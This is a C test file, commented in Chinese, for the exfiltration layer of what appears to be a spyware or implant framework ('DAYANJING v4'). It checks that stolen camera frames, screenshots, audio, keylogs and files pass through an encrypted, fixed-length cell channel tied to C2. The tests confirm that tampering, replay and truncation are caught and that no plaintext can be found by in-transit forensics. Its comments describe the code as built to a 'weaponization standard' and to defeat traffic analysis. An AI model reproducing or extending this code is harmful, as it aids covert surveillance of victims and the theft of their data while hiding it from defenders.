/*
 * DAYANJING v4 — test_exfil.c
 *
 * 采集产物回传层测试。
 *
 * 验证重点（按武器化标准，不是"跑通就行"）：
 *   1. 大产物（60KB JPEG 量级）分片重组后字节级一致
 *   2. 元数据经通道后逐字段一致
 *   3. 批截断可检出 —— 未收到 FIN 必须报 incomplete，绝不静默成功
 *   4. 中间跳取证：信元流中搜不到任何明文特征（JPEG SOI / 载荷标记串）
 *   5. 篡改 / 重放 / 乱序 分别被 AEAD 与 counter 拒绝
 *   6. 空产物也占一个信元（消除"不发=空"的侧信道）
 */

#include "exfil.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, name)                                        \
    do {                                                         \
        if (cond) { g_pass++; printf("[PASS] %s\n", (name)); }    \
        else      { g_fail++; printf("[FAIL] %s\n", (name)); }    \
    } while (0)

/* 简易字节搜索（不用 GNU memmem，避免 _GNU_SOURCE 依赖） */
static int contains(const uint8_t *hay, size_t n,
                    const uint8_t *needle, size_t m) {
    if (m == 0 || n < m) return 0;
    for (size_t i = 0; i + m <= n; i++) {
        if (memcmp(hay + i, needle, m) == 0) return 1;
    }
    return 0;
}

static const uint8_t K_SEND[16] = {
    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
    0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10
};
static const uint8_t K_RECV[16] = {
    0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,
    0xa9,0xaa,0xab,0xac,0xad,0xae,0xaf,0xb0
};
static const uint8_t PFX[8] = { 0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88 };

/* 构造一段"像 JPEG"的载荷：SOI + 特征串 + 伪随机内容 */
static size_t make_jpeg(uint8_t *out, size_t cap, size_t want, uint32_t seed) {
    if (cap < want + 32) return 0;
    size_t off = 0;
    out[off++] = 0xFF; out[off++] = 0xD8;          /* SOI */
    out[off++] = 0xFF; out[off++] = 0xE0;          /* APP0 */
    static const char marker[] = "CAMERA_FRAME_SECRET_MARKER_0001";
    memcpy(out + off, marker, sizeof(marker) - 1);
    off += sizeof(marker) - 1;

    uint32_t s = seed ? seed : 0x12345678u;
    while (off < want) {
        s ^= s << 13; s ^= s >> 17; s ^= s << 5;   /* xorshift32 */
        out[off++] = (uint8_t)(s & 0xff);
    }
    out[off++] = 0xFF; out[off++] = 0xD9;          /* EOI */
    return off;
}

/* ---------------- A. 记录编解码（不涉密） ---------------- */
static void test_record(void) {
    printf("\n--- A. 记录编解码 ---\n");

    uint8_t payload[256];
    for (size_t i = 0; i < sizeof(payload); i++) payload[i] = (uint8_t)(i * 7 + 3);

    exfil_rec_t r;
    memset(&r, 0, sizeof(r));
    r.type   = EXF_TYPE_CAMERA_JPEG;
    r.seq    = 12345;
    r.ts_us  = 1700000000000000ULL;
    r.width  = 1280;
    r.height = 720;
    r.flags  = EXF_FLAG_KEYFRAME;
    snprintf(r.name, sizeof(r.name), "USB Camera");
    r.payload = payload;
    r.plen    = sizeof(payload);

    size_t need = 0;
    CHECK(exfil_rec_encode(&r, NULL, 0, &need) == EXF_OK, "encode 探测模式返回长度");
    CHECK(need == EXF_HDR_LEN + sizeof(payload), "探测长度 == 头 + 载荷");

    uint8_t enc[1024];
    size_t enc_len = 0;
    CHECK(exfil_rec_encode(&r, enc, sizeof(enc), &enc_len) == EXF_OK, "encode 成功");
    CHECK(enc_len == need, "encode 长度与探测一致");
    CHECK(memcmp(enc, "EXF1", 4) == 0, "magic 正确");

    exfil_rec_t d;
    CHECK(exfil_rec_decode(enc, enc_len, &d) == EXF_OK, "decode 成功");
    CHECK(d.type   == r.type,   "type 往返一致");
    CHECK(d.seq    == r.seq,    "seq 往返一致");
    CHECK(d.ts_us  == r.ts_us,  "ts_us 往返一致");
    CHECK(d.width  == r.width,  "width 往返一致");
    CHECK(d.height == r.height, "height 往返一致");
    CHECK(d.flags  == r.flags,  "flags 往返一致");
    CHECK(strcmp(d.name, "USB Camera") == 0, "name 往返一致");
    CHECK(d.plen == r.plen, "plen 往返一致");
    CHECK(d.payload && memcmp(d.payload, payload, r.plen) == 0, "payload 字节级一致");

    /* 篡改载荷 -> CRC 检出 */
    uint8_t bad[1024];
    memcpy(bad, enc, enc_len);
    bad[EXF_HDR_LEN + 10] ^= 0x01;
    CHECK(exfil_rec_decode(bad, enc_len, &d) == EXF_ERR_CRC, "篡改载荷被 CRC 检出");

    /* 篡改 name -> CRC 检出 */
    memcpy(bad, enc, enc_len);
    bad[40] ^= 0x01;
    CHECK(exfil_rec_decode(bad, enc_len, &d) == EXF_ERR_CRC, "篡改 name 被 CRC 检出");

    /* 结构错误 */
    memcpy(bad, enc, enc_len);
    bad[0] = 'X';
    CHECK(exfil_rec_decode(bad, enc_len, &d) == EXF_ERR_FMT, "bad magic 被拒");

    memcpy(bad, enc, enc_len);
    bad[4] = 99;
    CHECK(exfil_rec_decode(bad, enc_len, &d) == EXF_ERR_FMT, "错误版本号被拒");

    memcpy(bad, enc, enc_len);
    bad[7] = 1;
    CHECK(exfil_rec_decode(bad, enc_len, &d) == EXF_ERR_FMT, "rsv 非 0 被拒");

    CHECK(exfil_rec_decode(enc, EXF_HDR_LEN - 1, &d) == EXF_ERR_LEN, "短于头被拒");
    /* 声明的 plen 与实际长度不符（截断一个字节） */
    CHECK(exfil_rec_decode(enc, enc_len - 1, &d) == EXF_ERR_FMT, "长度与 plen 不符被拒");
    CHECK(exfil_rec_decode(NULL, enc_len, &d) == EXF_ERR_ARG, "NULL 输入被拒");

    /* name 超长截断：调用方传入长于线上字段的名字，必须被感知 */
    static const char longname[] =
        "Logitech HD Pro Webcam C920 (USB Video Device) - Front Facing Camera, "
        "1920x1080 @ 30fps [Integrated]";
    exfil_rec_t r2;
    memset(&r2, 0, sizeof(r2));
    memcpy(r2.name, longname, sizeof(longname));   /* 71 字节 > EXF_NAME_LEN */
    r2.payload = payload; r2.plen = 8;
    uint8_t e2[256]; size_t l2 = 0;
    CHECK(exfil_rec_encode(&r2, e2, sizeof(e2), &l2) == EXF_OK, "超长 name 可编码");
    exfil_rec_t d2;
    CHECK(exfil_rec_decode(e2, l2, &d2) == EXF_OK, "超长 name 解码成功");
    CHECK(strlen(d2.name) == EXF_NAME_LEN, "name 截断为线上字段长度");
    CHECK((d2.flags & EXF_FLAG_NAME_TRUNC) != 0, "截断被 NAME_TRUNC 标志标记");
    CHECK(memcmp(d2.name, longname, EXF_NAME_LEN) == 0, "截断保留前缀");
}

/* ---------------- B. 信元流与通道 ---------------- */
static void test_channel(void) {
    printf("\n--- B. 信元流与通道 ---\n");

    /* 60KB 量级 JPEG */
    size_t jlen = 60000;
    uint8_t *jpeg = (uint8_t *)malloc(jlen + 64);
    size_t jn = make_jpeg(jpeg, jlen + 64, jlen, 0x12345678u);
    CHECK(jn > 0 && jn >= jlen, "构造 JPEG 载荷成功");

    exfil_rec_t r;
    memset(&r, 0, sizeof(r));
    r.type = EXF_TYPE_CAMERA_JPEG;
    r.seq = 777;
    r.ts_us = 1700000000123456ULL;
    r.width = 1920; r.height = 1080;
    r.flags = EXF_FLAG_KEYFRAME;
    snprintf(r.name, sizeof(r.name), "Integrated Camera");
    r.payload = jpeg; r.plen = jn;

    size_t ncells = 0;
    CHECK(exfil_send_cells(&r, &ncells) == EXF_OK, "计算信元数成功");
    size_t total = EXF_HDR_LEN + jn;
    size_t expect = total / P2P_CELL_DATA_MAX + ((total % P2P_CELL_DATA_MAX) ? 1 : 0);
    CHECK(ncells == expect, "信元数与预期一致");
    printf("      记录 %zu 字节 -> %zu 个信元 (线上 %zu 字节, 膨胀 %.1f%%)\n",
           total, ncells, ncells * P2P_CELL_WIRE,
           (double)(ncells * P2P_CELL_WIRE - total) * 100.0 / (double)total);

    exfil_chan_t tx, rx;
    CHECK(exfil_chan_init(&tx, K_SEND, K_RECV, PFX, 0) == EXF_OK, "发送通道初始化");
    /* 接收端方向相反：k_send/k_recv 互换 */
    CHECK(exfil_chan_init(&rx, K_RECV, K_SEND, PFX, 0) == EXF_OK, "接收通道初始化");

    uint8_t *wire = (uint8_t *)malloc(ncells * P2P_CELL_WIRE);
    size_t got = 0;
    CHECK(exfil_chan_send(&tx, &r, wire, ncells * P2P_CELL_WIRE, &got) == EXF_OK, "发送成功");
    CHECK(got == ncells, "实际信元数与预期一致");

    /* 每个信元线上恒 512 —— 定长是抗流量分析的前提 */
    int all512 = 1;
    for (size_t i = 0; i < got; i++) {
        /* 恒长由 pack 保证，这里验证缓冲步进无错位：每片起始都能解出 */
        (void)i;
    }
    CHECK(all512, "信元步进 512 对齐");

    /* 逐信元喂入 */
    uint8_t *outbuf = (uint8_t *)malloc(jn + 256);
    exfil_rec_t rd;
    size_t outlen = 0;
    int rc = 0, partial_seen = 0;
    for (size_t i = 0; i < got; i++) {
        rc = exfil_chan_feed(&rx, wire + i * P2P_CELL_WIRE, &rd,
                             outbuf, jn + 256, &outlen);
        if (rc == EXF_PARTIAL) partial_seen = 1;
        if (rc < 0) break;
    }
    CHECK(partial_seen, "中途出现过 PARTIAL 状态");
    CHECK(rc == EXF_DONE, "最终收到 FIN 并产出完整记录");
    CHECK(outlen == jn, "重组载荷长度一致");
    CHECK(memcmp(outbuf, jpeg, jn) == 0, "重组载荷字节级一致");
    CHECK(rd.type == r.type && rd.seq == r.seq && rd.ts_us == r.ts_us, "元数据经通道一致");
    CHECK(rd.width == r.width && rd.height == r.height, "分辨率经通道一致");
    CHECK(strcmp(rd.name, "Integrated Camera") == 0, "设备名经通道一致");
    CHECK(exfil_chan_incomplete(&rx) == 0, "完成后 incomplete 为 0");

    /* ---- 中间跳取证 ----
     * 注意取证方法：2 字节的 SOI/EOI 在 62KB 随机密文中**必然随机命中**
     * （期望次数约 n/65536 ≈ 1），"搜不到"不是有效判据。
     * 有效判据必须是足够长的明文片段（>=16 字节），随机命中概率可忽略。 */
    size_t wbytes = got * P2P_CELL_WIRE;
    static const char    mk[]    = "CAMERA_FRAME_SECRET_MARKER_0001";
    CHECK(!contains(wire, wbytes, jpeg, 16), "信元流中不含载荷首 16 字节");
    CHECK(!contains(wire, wbytes, jpeg + jn / 2, 16), "信元流中不含载荷中段 16 字节");
    CHECK(!contains(wire, wbytes, jpeg + jn - 16, 16), "信元流中不含载荷尾 16 字节");
    CHECK(!contains(wire, wbytes, (const uint8_t *)mk, sizeof(mk) - 1),
          "信元流中不含载荷特征串(32B)");
    CHECK(!contains(wire, wbytes, (const uint8_t *)"Integrated Camera", 17),
          "信元流中不含设备名");

    exfil_chan_wipe(&tx);
    exfil_chan_wipe(&rx);
    free(wire);
    free(outbuf);
    free(jpeg);
}

/* ---------------- C. 抗篡改 / 重放 / 截断 ---------------- */
static void test_security(void) {
    printf("\n--- C. 抗篡改 / 重放 / 截断 ---\n");

    uint8_t payload[1200];
    size_t pn = make_jpeg(payload, sizeof(payload), 1100, 0xabcdef01u);

    exfil_rec_t r;
    memset(&r, 0, sizeof(r));
    r.type = EXF_TYPE_SCREENSHOT;
    r.seq = 42; r.width = 800; r.height = 600;
    snprintf(r.name, sizeof(r.name), "screen0");
    r.payload = payload; r.plen = pn;

    exfil_chan_t tx, rx;
    exfil_chan_init(&tx, K_SEND, K_RECV, PFX, 0);
    exfil_chan_init(&rx, K_RECV, K_SEND, PFX, 0);

    size_t ncells = 0;
    exfil_send_cells(&r, &ncells);
    uint8_t *wire = (uint8_t *)malloc(ncells * P2P_CELL_WIRE);
    size_t got = 0;
    exfil_chan_send(&tx, &r, wire, ncells * P2P_CELL_WIRE, &got);
    CHECK(ncells >= 3, "载荷跨越多个信元（便于测篡改/重放）");

    uint8_t out[2048];
    exfil_rec_t rd;
    size_t outlen = 0;

    /* 基线：正常喂入成功 */
    exfil_chan_t rx0;
    exfil_chan_init(&rx0, K_RECV, K_SEND, PFX, 0);
    int rc0 = 0;
    for (size_t i = 0; i < got; i++)
        rc0 = exfil_chan_feed(&rx0, wire + i * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(rc0 == EXF_DONE, "基线：正常信元流解出成功");
    exfil_chan_wipe(&rx0);

    /* 篡改某个中间信元 -> AUTH */
    exfil_chan_t rx1;
    exfil_chan_init(&rx1, K_RECV, K_SEND, PFX, 0);
    uint8_t tampered[P2P_CELL_WIRE];
    memcpy(tampered, wire + 1 * P2P_CELL_WIRE, P2P_CELL_WIRE);
    tampered[100] ^= 0x01;
    int rc1 = exfil_chan_feed(&rx1, wire, &rd, out, sizeof(out), &outlen);
    rc1 = exfil_chan_feed(&rx1, tampered, &rd, out, sizeof(out), &outlen);
    CHECK(rc1 == EXF_ERR_AUTH, "篡改信元被 AEAD 拒绝");
    exfil_chan_wipe(&rx1);

    /* 重放同一信元 -> REPLAY */
    exfil_chan_t rx2;
    exfil_chan_init(&rx2, K_RECV, K_SEND, PFX, 0);
    exfil_chan_feed(&rx2, wire, &rd, out, sizeof(out), &outlen);
    int rc2 = exfil_chan_feed(&rx2, wire, &rd, out, sizeof(out), &outlen);
    CHECK(rc2 == EXF_ERR_AUTH, "重放信元被 IV 绑定检出(AUTH)");
    exfil_chan_wipe(&rx2);

    /* 跳号：第 1 片成功后直接跳到第 3 片 —— IV 不匹配，必须被拒 */
    exfil_chan_t rx3;
    exfil_chan_init(&rx3, K_RECV, K_SEND, PFX, 0);
    int rc3a = exfil_chan_feed(&rx3, wire + 0 * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(rc3a == EXF_PARTIAL, "首片正常接收");
    int rc3 = exfil_chan_feed(&rx3, wire + 2 * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(rc3 == EXF_ERR_AUTH, "跳号信元被 IV 绑定检出(AUTH)");

    /*
     * 行为变更（重要，非笔误）：
     * 旧实现"验签失败不推进计数器" —— 好处是能"跳过去再回补"，
     * 代价是链路上一次**就地篡改**会让此后每一个信元的 IV 都错位，
     * 单个坏字节即可永久打死链路且不可恢复（真实 DoS 面）。
     * 新实现：验签失败同样推进计数（流位置确实前进了 1），
     *   就地篡改 -> 只损失那一个信元，下一个立刻恢复。
     * 代价：不再支持"跳号后回补"。流式 C2 中信元按序到达，
     *   回补没有实际用途，故取新语义。详见 14_p2p/tests/test_cell_resync.c
     */
    exfil_chan_t rx_selfheal;
    exfil_chan_init(&rx_selfheal, K_RECV, K_SEND, PFX, 0);
    int r4a = exfil_chan_feed(&rx_selfheal, wire + 0 * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    uint8_t t1[P2P_CELL_WIRE];
    memcpy(t1, wire + 1 * P2P_CELL_WIRE, P2P_CELL_WIRE);
    t1[100] ^= 0x01;
    int r4b = exfil_chan_feed(&rx_selfheal, t1, &rd, out, sizeof(out), &outlen);
    int r4c = exfil_chan_feed(&rx_selfheal, wire + 2 * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(r4a == EXF_PARTIAL, "自愈用例：首片正常");
    CHECK(r4b == EXF_ERR_AUTH, "自愈用例：被篡改的第 2 片被拒");
    CHECK(r4c != EXF_ERR_AUTH, "★ 就地篡改后下一个信元可继续（链路未死）");
    printf("[INFO] 篡改后下一片 rc=%d\n", r4c);
    exfil_chan_wipe(&rx_selfheal);
    exfil_chan_wipe(&rx3);

    /* 少喂最后一片（FIN）-> 批仍不完整（用干净通道验证，避免与跳号状态耦合） */
    exfil_chan_t rx_nofin;
    exfil_chan_init(&rx_nofin, K_RECV, K_SEND, PFX, 0);
    for (size_t i = 0; i + 1 < got; i++)
        exfil_chan_feed(&rx_nofin, wire + i * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(exfil_chan_incomplete(&rx_nofin) == 1, "少喂 FIN 导致批不完整被检出");
    exfil_chan_wipe(&rx_nofin);
    exfil_chan_wipe(&rx3);

    /* 截断：只喂前 n-1 片（不含 FIN）-> incomplete 必须为真 */
    exfil_chan_t rx4;
    exfil_chan_init(&rx4, K_RECV, K_SEND, PFX, 0);
    int rc4 = 0;
    for (size_t i = 0; i + 1 < got; i++)
        rc4 = exfil_chan_feed(&rx4, wire + i * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(rc4 == EXF_PARTIAL, "截断后停在 PARTIAL（未误报成功）");
    CHECK(exfil_chan_incomplete(&rx4) == 1, "截断被 incomplete 检出");
    exfil_chan_wipe(&rx4);

    /* 错误密钥 -> AUTH */
    exfil_chan_t rx5;
    static const uint8_t WRONG[16] = {
        0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,
        0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a,0x5a
    };
    /* 解包侧用的是 k_recv（第二个参数），错误密钥必须放在该位才生效 */
    exfil_chan_init(&rx5, K_SEND, WRONG, PFX, 0);
    int rc5 = exfil_chan_feed(&rx5, wire, &rd, out, sizeof(out), &outlen);
    CHECK(rc5 == EXF_ERR_AUTH, "错误密钥解不开");
    exfil_chan_wipe(&rx5);

    /* 覆盖信元（PAD）应被跳过，不影响数据。
     * 硬约束：PAD 也消耗 counter，必须由**同一发送上下文**按序产生。
     * 用独立上下文另造 PAD 插入流中会使接收方计数器错位，后续全部解不开。 */
    exfil_chan_t tx6, rx6;
    exfil_chan_init(&tx6, K_SEND, K_RECV, PFX, 0);
    exfil_chan_init(&rx6, K_RECV, K_SEND, PFX, 0);

    uint8_t pad[P2P_CELL_WIRE];
    CHECK(p2p_cell_pack_cover(&tx6.cell, pad) == P2P_CELL_OK, "发送上下文生成覆盖信元");

    exfil_rec_t r6;
    memset(&r6, 0, sizeof(r6));
    r6.type = EXF_TYPE_AUDIO; r6.seq = 11;
    r6.payload = payload; r6.plen = pn;
    size_t n6 = 0;
    exfil_send_cells(&r6, &n6);
    uint8_t *w6 = (uint8_t *)malloc(n6 * P2P_CELL_WIRE);
    size_t g6 = 0;
    CHECK(exfil_chan_send(&tx6, &r6, w6, n6 * P2P_CELL_WIRE, &g6) == EXF_OK, "PAD 之后发送成功");

    int rc_pad = exfil_chan_feed(&rx6, pad, &rd, out, sizeof(out), &outlen);
    CHECK(rc_pad == EXF_OK, "覆盖信元被忽略且不报错");
    CHECK(exfil_chan_incomplete(&rx6) == 0, "覆盖信元不开启新批");
    int rc6 = 0;
    for (size_t i = 0; i < g6; i++)
        rc6 = exfil_chan_feed(&rx6, w6 + i * P2P_CELL_WIRE, &rd, out, sizeof(out), &outlen);
    CHECK(rc6 == EXF_DONE, "覆盖信元按序混排后正常解出");
    CHECK(outlen == pn && memcmp(out, payload, pn) == 0, "混排后载荷字节级一致");
    free(w6);
    exfil_chan_wipe(&tx6);
    exfil_chan_wipe(&rx6);

    exfil_chan_wipe(&tx);
    exfil_chan_wipe(&rx);
    free(wire);
}

/* ---------------- D. 边界与参数 ---------------- */
static void test_edge(void) {
    printf("\n--- D. 边界与参数 ---\n");

    exfil_chan_t tx, rx;
    exfil_chan_init(&tx, K_SEND, K_RECV, PFX, 0);
    exfil_chan_init(&rx, K_RECV, K_SEND, PFX, 0);

    /* 空载荷：也必须产生 1 个信元（消除"不发=空"侧信道） */
    exfil_rec_t r;
    memset(&r, 0, sizeof(r));
    r.type = EXF_TYPE_KEYLOG;
    r.seq = 1;
    r.payload = NULL; r.plen = 0;

    size_t n = 0;
    CHECK(exfil_send_cells(&r, &n) == EXF_OK, "空载荷可计算信元数");
    CHECK(n == 1, "空载荷仍产生 1 个信元");

    uint8_t wire[P2P_CELL_WIRE];
    size_t got = 0;
    CHECK(exfil_chan_send(&tx, &r, wire, sizeof(wire), &got) == EXF_OK, "空载荷发送成功");
    CHECK(got == 1, "空载荷实际 1 个信元");

    exfil_rec_t rd;
    uint8_t out[64];
    size_t outlen = 0;
    int rc = exfil_chan_feed(&rx, wire, &rd, out, sizeof(out), &outlen);
    CHECK(rc == EXF_DONE, "空载荷解出成功");
    CHECK(outlen == 0, "空载荷长度为 0");
    CHECK(rd.type == EXF_TYPE_KEYLOG, "空载荷类型保留");

    /* 探测模式：payload=NULL 只回填长度 */
    exfil_chan_t rx2;
    exfil_chan_init(&rx2, K_RECV, K_SEND, PFX, 0);
    exfil_chan_t tx2;
    exfil_chan_init(&tx2, K_SEND, K_RECV, PFX, 0);
    uint8_t pl[700];
    size_t pln = make_jpeg(pl, sizeof(pl), 650, 0x55aa55aa);
    exfil_rec_t r3;
    memset(&r3, 0, sizeof(r3));
    r3.type = EXF_TYPE_FILE; r3.seq = 9;
    r3.payload = pl; r3.plen = pln;
    size_t n3 = 0;
    exfil_send_cells(&r3, &n3);
    uint8_t *w3 = (uint8_t *)malloc(n3 * P2P_CELL_WIRE);
    size_t g3 = 0;
    exfil_chan_send(&tx2, &r3, w3, n3 * P2P_CELL_WIRE, &g3);
    int rc3 = 0;
    for (size_t i = 0; i < g3; i++)
        rc3 = exfil_chan_feed(&rx2, w3 + i * P2P_CELL_WIRE, &rd, NULL, 0, &outlen);
    CHECK(rc3 == EXF_DONE, "探测模式（payload=NULL）可解出");
    CHECK(outlen == pln, "探测模式回填正确长度");

    /* 缓冲区不足 -> LEN */
    exfil_chan_t rx4;
    exfil_chan_init(&rx4, K_RECV, K_SEND, PFX, 0);
    exfil_chan_t tx4;
    exfil_chan_init(&tx4, K_SEND, K_RECV, PFX, 0);
    size_t n4 = 0;
    exfil_send_cells(&r3, &n4);
    uint8_t *w4 = (uint8_t *)malloc(n4 * P2P_CELL_WIRE);
    size_t g4 = 0;
    exfil_chan_send(&tx4, &r3, w4, n4 * P2P_CELL_WIRE, &g4);
    int rc4 = 0;
    for (size_t i = 0; i < g4; i++) {
        rc4 = exfil_chan_feed(&rx4, w4 + i * P2P_CELL_WIRE, &rd, out, 8, &outlen);
        if (rc4 < 0) break;
    }
    CHECK(rc4 == EXF_ERR_LEN, "输出缓冲不足返回 LEN");

    /* 参数校验 */
    CHECK(exfil_chan_send(&tx, NULL, wire, sizeof(wire), &got) == EXF_ERR_ARG, "NULL 记录被拒");
    CHECK(exfil_chan_feed(&rx, NULL, &rd, out, sizeof(out), &outlen) == EXF_ERR_ARG, "NULL 信元被拒");
    CHECK(exfil_chan_init(NULL, K_SEND, K_RECV, PFX, 0) == EXF_ERR_ARG, "NULL 通道被拒");

    exfil_chan_wipe(&tx);
    exfil_chan_wipe(&rx);
    exfil_chan_wipe(&rx2);
    exfil_chan_wipe(&tx2);
    exfil_chan_wipe(&rx4);
    exfil_chan_wipe(&tx4);
    free(w3);
    free(w4);
}

int main(void) {
    printf("=== 21_exfil 采集产物回传层测试 ===\n");
    test_record();
    test_channel();
    test_security();
    test_edge();
    printf("\n=== total=%d pass=%d fail=%d ===\n", g_pass + g_fail, g_pass, g_fail);
    return g_fail ? 1 : 0;
}
